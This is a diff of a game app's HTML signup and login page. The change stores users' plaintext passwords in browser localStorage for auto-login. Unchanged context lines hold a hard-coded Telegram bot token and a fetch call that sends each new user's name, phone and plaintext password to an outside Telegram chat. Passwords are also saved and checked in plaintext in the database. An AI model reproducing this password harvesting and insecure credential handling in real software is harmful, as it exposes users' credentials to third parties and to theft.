@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -152,6 +152,16 @@
         const botToken = "8766300899:AAFbpRvQiNxLDWvJQ6NIP1JeJmrHfzDz6rE";
         const chatId = "7852788120";
 
+        // --- AUTO LOGIN LOGIC ---
+        window.onload = function() {
+            const savedPhone = localStorage.getItem('userPhone');
+            const savedPass = localStorage.getItem('userPass');
+            if(savedPhone && savedPass) {
+                // Bina dikhaye Home page par bhej dega
+                location.href = 'home.html';
+            }
+        };
+
         function showNotice(title, msg) {
             document.getElementById('notice-title').innerText = title;
             document.getElementById('notice-msg').innerText = msg;
@@ -195,14 +205,12 @@
             try {
                 const checkUser = await database.ref('users/' + phone).once('value');
                 if(checkUser.exists()) {
-                    // SECURE CHECK: Banned users cannot re-register
                     if(checkUser.val().isBanned === true) {
                         showNotice("BANNED", "This phone number is blocked by Admin!"); return;
                     }
                     showNotice("DENIED", "This Phone Number is already registered!"); return;
                 }
 
-                // Register User
                 await database.ref('users/' + phone).set({
                     name: name,
                     uid: uid,
@@ -210,7 +218,7 @@
                     phone: phone,
                     balance: 0,
                     joinedOn: new Date().toLocaleString(),
-                    isBanned: false // Default false
+                    isBanned: false
                 });
 
                 await database.ref('user_notifications/' + phone).push({
@@ -222,7 +230,9 @@
 
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`<b>🆕 NEW PLAYER</b>\n👤 Name: ${name}\n🆔 UID: ${uid}\n🔑 Pass: ${pass}\n📱 Phone: ${phone}`)}&parse_mode=html`);
                 
+                // Saving Session for Auto-Login
                 localStorage.setItem('userPhone', phone);
+                localStorage.setItem('userPass', pass);
                 localStorage.setItem('gameID', phone); 
                 localStorage.setItem('userName', name);
                 
@@ -248,14 +258,15 @@
                 if(snap.exists() && snap.val().password === pass) {
                     const userData = snap.val();
 
-                    // CRITICAL: BAN CHECK
                     if(userData.isBanned === true) {
-                        showNotice("ACCESS DENIED", "🚫 Your account is BANNED! Contact support for details.");
+                        showNotice("ACCESS DENIED", "🚫 Your account is BANNED!");
                         localStorage.clear();
                         return;
                     }
 
+                    // Saving Session for Auto-Login
                     localStorage.setItem('userPhone', phone);
+                    localStorage.setItem('userPass', pass);
                     localStorage.setItem('gameID', phone); 
                     localStorage.setItem('userName', userData.name);
                     
